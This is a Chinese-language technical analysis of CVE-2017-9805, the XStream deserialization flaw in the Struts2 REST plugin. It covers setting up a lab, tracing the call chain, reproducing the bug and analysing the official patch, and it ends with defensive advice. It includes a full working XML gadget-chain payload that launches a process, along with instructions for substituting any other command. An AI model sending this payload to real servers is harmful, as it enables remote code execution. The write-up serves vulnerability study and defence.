## 1 **漏洞基本信息**

 **漏洞描述：** Struts2
REST插件的XStream组件存在反序列化漏洞，使用XStream组件对XML格式的数据包进行反序列化操作时，未对数据内容进行有效验证，存在安全隐患，可被远程攻击。

 **漏洞编号：** CVE-2017-9805

 **官方评级** ：高危

 **漏洞利用条件：** 使用受影响版本范围内的REST插件

 **漏洞利用方式：** 攻击者构建恶意数据包远程命名执行

 **影响版本：** Struts 2.1.2 - Struts 2.3.33, Struts 2.5 - Struts 2.5.12

##  **2 漏洞环境搭建**

官方下载源码：https://github.com/apache/Struts.git

切换到5.12分支

![1635496586_617bb28ae9e61bd38d608.png!small?1635496587390](https://image.3001.net/images/20211029/1635496586_617bb28ae9e61bd38d608.png!small?1635496587390)

把源码包中src/apps/rest-showcase整个文件夹拷贝出来，新建一个项目，用IDEA导入项目，配置tomcat和jdk，需要注意的是由于javax.imageio的依赖关系，我们的环境的jdk版本需要是jdk8以上，debug模式运行后就可以的调试了

![1635496600_617bb2981643ccd2c1084.png!small?1635496600336](https://image.3001.net/images/20211029/1635496600_617bb2981643ccd2c1084.png!small?1635496600336)

## 3 **漏洞详细分析**

本次漏洞是因为当Struts2使用REST插件的XStream的实例xstreamhandler处理反序列化XML的数据包时未对数据内容进行有效验证，导致了远程执行代码，攻击者可以利用该漏洞构造恶意的XML内容获取服务器权限。

根据官方公告以及漏洞原理可知，该漏洞出现在xstreamhandler类中，所以我们打开这个类，该类中有toObjec方法，其作用就是对xml内容进行反序列化。

![1635496666_617bb2da88cdac90f2241.png!small?1635496666712](https://image.3001.net/images/20211029/1635496666_617bb2da88cdac90f2241.png!small?1635496666712)

所以我们向上追踪漏洞爆发行，发现org.apache.struts2.rest.ContentTypeInterceptor#intercept这个方法调用了toObject方法，于是我们在这里打一个断点，然后构造数据包，使用Postman发包进行断点调试同时将Content-Type 改为application/xml，数据包如下：

    
    
    <map> 
      <entry> 
        <jdk.nashorn.internal.objects.NativeString> 
          <flags>0</flags>  
          <value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data"> 
            <dataHandler> 
              <dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource"> 
                <is class="javax.crypto.CipherInputStream"> 
                  <cipher class="javax.crypto.NullCipher"> 
                    <initialized>false</initialized>  
                    <opmode>0</opmode>  
                    <serviceIterator class="javax.imageio.spi.FilterIterator"> 
                      <iter class="javax.imageio.spi.FilterIterator"> 
                        <iter class="java.util.Collections$EmptyIterator"/>  
                        <next class="java.lang.ProcessBuilder"> 
                          <command> 
                            <string>calc.exe</string> 
                          </command>  
                          <redirectErrorStream>false</redirectErrorStream> 
                        </next> 
                      </iter>  
                      <filter class="javax.imageio.ImageIO$ContainsFilter"> 
                        <method> 
                          <class>java.lang.ProcessBuilder</class>  
                          <name>start</name>  
                          <parameter-types/> 
                        </method>  
                        <name>foo</name> 
                      </filter>  
                      <next class="string">foo</next> 
                    </serviceIterator>  
                    <lock/> 
                  </cipher>  
                  <input class="java.lang.ProcessBuilder$NullInputStream"/>  
                  <ibuffer/>  
                  <done>false</done>  
                  <ostart>0</ostart>  
                  <ofinish>0</ofinish>  
                  <closed>false</closed> 
                </is>  
                <consumed>false</consumed> 
              </dataSource>  
              <transferFlavors/> 
            </dataHandler>  
            <dataLen>0</dataLen> 
          </value> 
        </jdk.nashorn.internal.objects.NativeString>  
        <jdk.nashorn.internal.objects.NativeString reference="../jdk.nashorn.internal.objects.NativeString"/> 
      </entry>  
      <entry> 
        <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>  
        <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/> 
      </entry> 
    </map>

![1635496762_617bb33a4cc8db27f86c6.png!small?1635496762706](https://image.3001.net/images/20211029/1635496762_617bb33a4cc8db27f86c6.png!small?1635496762706)![1635496768_617bb34025dfe8d26fee4.png!small?1635496768365](https://image.3001.net/images/20211029/1635496768_617bb34025dfe8d26fee4.png!small?1635496768365)![1635496775_617bb34710f126c04c9ba.png!small?1635496775442](https://image.3001.net/images/20211029/1635496775_617bb34710f126c04c9ba.png!small?1635496775442)

ContentTypeHandler handler = selector.getHandlerForRequest(request);

直接从request中获取了数据执行方法：org.apache.struts2.rest.handler.XStreamHandler

说明该参数是用户可控的，这是漏洞形成的关键因素

handler.toObject(reader, target);
对获取到的序列化的xml数据进行反序列化操作，在这一阶段将序列化的恶意数据包进行反序列化操作并造成代码执行，接下来进行详细分析。

点击Send触发断点，跟进断点发现XStreamHanler类的toObject方法调用了XStream.fromXml方法，从而进入反序列化流程，先把我们的数据包作为xml参数传入fromXML方法，后面接着调用了XStream的unmarshal()方法，参数是经过fromXML处理后的数据包字符输入流

![1635496794_617bb35a846375a36efd0.png!small?1635496794792](https://image.3001.net/images/20211029/1635496794_617bb35a846375a36efd0.png!small?1635496794792)![1635496800_617bb360bac15121e2db0.png!small?1635496801002](https://image.3001.net/images/20211029/1635496800_617bb360bac15121e2db0.png!small?1635496801002)

继续执行，看到反序列化函数unmarshal，在这个函数执行过程中没有进行数据安全检查，导致远程代码执行

![1635496811_617bb36b783133623c2fa.png!small?1635496811661](https://image.3001.net/images/20211029/1635496811_617bb36b783133623c2fa.png!small?1635496811661)继续跟入XStream的unmarshal()方法，可以看到后面调用了com.thoughtworks.xstream.core.AbstractTreeMarshallingStrategy#unmarshal方法![1635496848_617bb390b195d0899973c.png!small?1635496848911](https://image.3001.net/images/20211029/1635496848_617bb390b195d0899973c.png!small?1635496848911)

知识拓展：

在这里进行一下知识拓展，便于后续分析代码过程中对代码的理解

1、MarshallingStrategy编组和解组策略的核心接口，涉及到的两个方法：

marshal：编组对象图unmarshal:解组对象图TreeUnmarshaller
树解组程序，调用mapper和Converter把XML转化成java对象，里面的start方法开始解组，convertAnother方法把class转化成java对象。TreeMarshaller
树编组程序，调用mapper和Converter把java对象转化成XML，里面的start方法开始编组，convertAnother方法把java对象转化成XML。

2、ConverterLookup
通过Mapper获取的Class对象后，接着调用lookupConverterForType获取对应Class的转换器，将其转化成对应实例对象。DefaultConverterLookup是该接口的实现类，同时实现了ConverterRegistry的接口，所有DefaultConverterLookup具备查找converter功能和注册converter功能。所有注册的转换器按一定优先级组成由TreeSet保存的有序集合(PS:XStream
默认使用了DefaultConverterLookup)。  
  
---  
  
继续跟入代码，接着调用了start()进行JAVA对象转换，通过节点名获取Mapper中对应的Class，继续跟入

![1635496904_617bb3c8474ce48f62dd4.png!small?1635496904503](https://image.3001.net/images/20211029/1635496904_617bb3c8474ce48f62dd4.png!small?1635496904503)![1635496909_617bb3cd129a2da263267.png!small?1635496909245](https://image.3001.net/images/20211029/1635496909_617bb3cd129a2da263267.png!small?1635496909245)

接着进入convertAnother()方法，也就是上文提到的xml到java类对象的一系列转换，即根据class转换成对应的java对象

![1635496919_617bb3d715f061446ceb7.png!small?1635496919361](https://image.3001.net/images/20211029/1635496919_617bb3d715f061446ceb7.png!small?1635496919361)![1635496923_617bb3dbdb0c010c3723e.png!small?1635496924217](https://image.3001.net/images/20211029/1635496923_617bb3dbdb0c010c3723e.png!small?1635496924217)![1635496929_617bb3e1898f1ba59237f.png!small?1635496929791](https://image.3001.net/images/20211029/1635496929_617bb3e1898f1ba59237f.png!small?1635496929791)

经过转换后，继续跟进调用了MapConvert的unmarshal()方法，实例化生成一个map对象，之后接着调用了populateMap()方法把数据封装到了map对象中

![1635496939_617bb3eb402639744369d.png!small?1635496939430](https://image.3001.net/images/20211029/1635496939_617bb3eb402639744369d.png!small?1635496939430)

继续跟进populateMap()方法，发现调用了com.thoughtworks.xstream.converters.collections.MapConverter#putCurrentEntryIntoMap方法

![1635496950_617bb3f60ca8e5907e667.png!small?1635496950244](https://image.3001.net/images/20211029/1635496950_617bb3f60ca8e5907e667.png!small?1635496950244)

接着进入com.thoughtworks.xstream.converters.collections.MapConverter#putCurrentEntryIntoMap调用了hashmap
put方法，这里的key就是我们构造的entry类实例对象

![1635496960_617bb400b599f6ffaad19.png!small?1635496961039](https://image.3001.net/images/20211029/1635496960_617bb400b599f6ffaad19.png!small?1635496961039)

后面就是相继调用了hashmap hash()方法和 NativeString hashcode()方法，先看NativeString，如图

![1635496976_617bb410aac8f89c71c9c.png!small?1635496976858](https://image.3001.net/images/20211029/1635496976_617bb410aac8f89c71c9c.png!small?1635496976858)

跟入getStringValue()方法，这里的value值是Base64Data类实例化对象，所以接着就调用了Base64Data
toString()方法

![1635496988_617bb41cb2f856dbb1c2c.png!small?1635496988992](https://image.3001.net/images/20211029/1635496988_617bb41cb2f856dbb1c2c.png!small?1635496988992)

继续跟入Base64Data类中toString()方法，跟着直接查看Base64Data get()方法

![1635497000_617bb428984f0ddc48e91.png!small?1635497000875](https://image.3001.net/images/20211029/1635497000_617bb428984f0ddc48e91.png!small?1635497000875)

分析上图代码: this.dataHandler.getDataSource().getInputStream();

分为两部分来看

首先程序执行this.dataHandler.getDataSource()，即是获取Base64Data对象中dataHandler属性的DataSource值。

随后程序执行com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource类的getInputStream方法，这将获取com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSourc的is属性值

并以此为参数传入com.sun.xml.internal.bind.v2.util.ByteArrayOutputStreamEx类的readForm方法，跟入ByteArrayOutputStreamEx类的readForm()，这里的is也就是javax.crypto.CipherInputStream类，所以后面也就是调用了CipherInputStream类的read()方法

![1635497012_617bb4340705b234f2605.png!small?1635497012243](https://image.3001.net/images/20211029/1635497012_617bb4340705b234f2605.png!small?1635497012243)

继续跟入，在CipherInputStream类的read()方法读取inputstream对象全部内容

![1635497023_617bb43f747c84223c979.png!small?1635497023824](https://image.3001.net/images/20211029/1635497023_617bb43f747c84223c979.png!small?1635497023824)

接下来就是inputstream的层层读取，就没必要一一往下看了，这里给出读取的调用栈

读取之后就调用了到javax.imageio.spi.ServiceRegistry注册服务类的next()方法，

![1635497034_617bb44a9ea73eb5095e6.png!small?1635497035128](https://image.3001.net/images/20211029/1635497034_617bb44a9ea73eb5095e6.png!small?1635497035128)![1635497039_617bb44fa972d2f21abc9.png!small?1635497039915](https://image.3001.net/images/20211029/1635497039_617bb44fa972d2f21abc9.png!small?1635497039915)

再跟进ServiceRegistry类的advance()方法，首先先判断迭代器的下一个对象是否为空，即调用hasNext()方法，不为空则返回true并进入while循环取出对象；而这里的iter是我们预先构建好的迭代器，返回生成对象elt是processBuilder类，接下来就调用了javax.imageio.ImageIO.ContainsFilter#filter方法

在调试栏中ImageIO$ContainsFilter这个内部类里对应的属性其实就是跟我们的数据包一一对应的

![1635497053_617bb45d52331aa68badd.png!small?1635497053741](https://image.3001.net/images/20211029/1635497053_617bb45d52331aa68badd.png!small?1635497053741)

最后跟进javax.imageio.ImageIO.ContainsFilter#filter方法

![1635497064_617bb4683d67c0bbfcd61.png!small?1635497064440](https://image.3001.net/images/20211029/1635497064_617bb4683d67c0bbfcd61.png!small?1635497064440)![1635497068_617bb46c134097fe70cdb.png!small?1635497068425](https://image.3001.net/images/20211029/1635497068_617bb46c134097fe70cdb.png!small?1635497068425)

我们可以看到这里的method是正是ProcessBuilder().start()方法，是用反射调用到了ProcessBuilder类的start()方法，其他所需的参数也都包含在ImageIO$ContainsFilter这个内部类中，经过以上分析可知，这个类所创建的对象是可控的，也就是说参数是用户可控的，并且参数传递过程中没有做有效的校验，从而导致了代码执行的漏洞，漏洞触发成功。

![1635497077_617bb475394eae1e58bef.png!small?1635497077548](https://image.3001.net/images/20211029/1635497077_617bb475394eae1e58bef.png!small?1635497077548)

最后给出整个调用栈截图

![1635497085_617bb47db402b9a797ae7.png!small?1635497086059](https://image.3001.net/images/20211029/1635497085_617bb47db402b9a797ae7.png!small?1635497086059)

## 4 **漏洞复现**

启动工程，然后通过burpsuite进行抓包，然后Send to Reapeater 进行数据包篡改

注意事项：

> 修改Content-Type的值为：application/xml。
>
>
> POC就是上述给出的数据包，是在windows服务器上弹出计算器的payload,若想修改为其他执行payload，将<string>calc.exe</string>中的calc.exe替换为想执行的命令，空格用多个
> <string></string>标签嵌套

点击Submit进行抓包

![1635497100_617bb48cca4ba48bac527.png!small?1635497101134](https://image.3001.net/images/20211029/1635497100_617bb48cca4ba48bac527.png!small?1635497101134)

修改数据包，成功弹出计算机，漏洞复现成功

![1635497110_617bb496061971cae765f.png!small?1635497110424](https://image.3001.net/images/20211029/1635497110_617bb496061971cae765f.png!small?1635497110424)

## 5 **漏洞修复**

### 5.1 **补丁分析**

对struts2-rest-plugin-2.5.12.jar中的struts-plugin.xml进行分析，可以看到ContentTypeHandler的默认实现类就是XStreamHanler，而且xml是默认支持格式，这也就是说存在rest插件就会存在XStream的反序列化漏洞。

![1635497128_617bb4a888e994a4e1239.png!small?1635497128808](https://image.3001.net/images/20211029/1635497128_617bb4a888e994a4e1239.png!small?1635497128808)

  

查看官方修复补丁：[
_https://github.com/apache/struts/commit/19494718865f2fb7da5ea363de3822f87fbda264_](https://github.com/apache/struts/commit/19494718865f2fb7da5ea363de3822f87fbda264)

我们可以看出主要修复逻辑在

plugins/rest/src/main/java/org/apache/struts2/rest/handler/XStreamHandler.java中：

在反序列化时没有直接调用xstream.fromXML(in,
target)方法进行反序列化，而是在这之前进行了有效的处理，主要就是将xml中的数据白名单化，这样就能阻止XStream反序列化的过程中带入一些有害类。

![1635497143_617bb4b71868d5edb6f19.png!small?1635497143319](https://image.3001.net/images/20211029/1635497143_617bb4b71868d5edb6f19.png!small?1635497143319)![1635497147_617bb4bb3a063f33fc65d.png!small?1635497147490](https://image.3001.net/images/20211029/1635497147_617bb4bb3a063f33fc65d.png!small?1635497147490)![1635497151_617bb4bf78ced832bede9.png!small?1635497151877](https://image.3001.net/images/20211029/1635497151_617bb4bf78ced832bede9.png!small?1635497151877)

### 5.2 **防御方案**

 **方案一**

升级Struts到2.5.13最新版本

 **方案二**

如果系统没有使用Struts REST插件，那么可以直接删除Struts REST插件，或者在配置文件中加入如下代码，限制服务端文件的扩展名

<constant name=”struts.action.extension” value=”xhtml,,json” />

 **参考：**

https://www.freebuf.com/geek/208654.html

https://yaofeifly.github.io

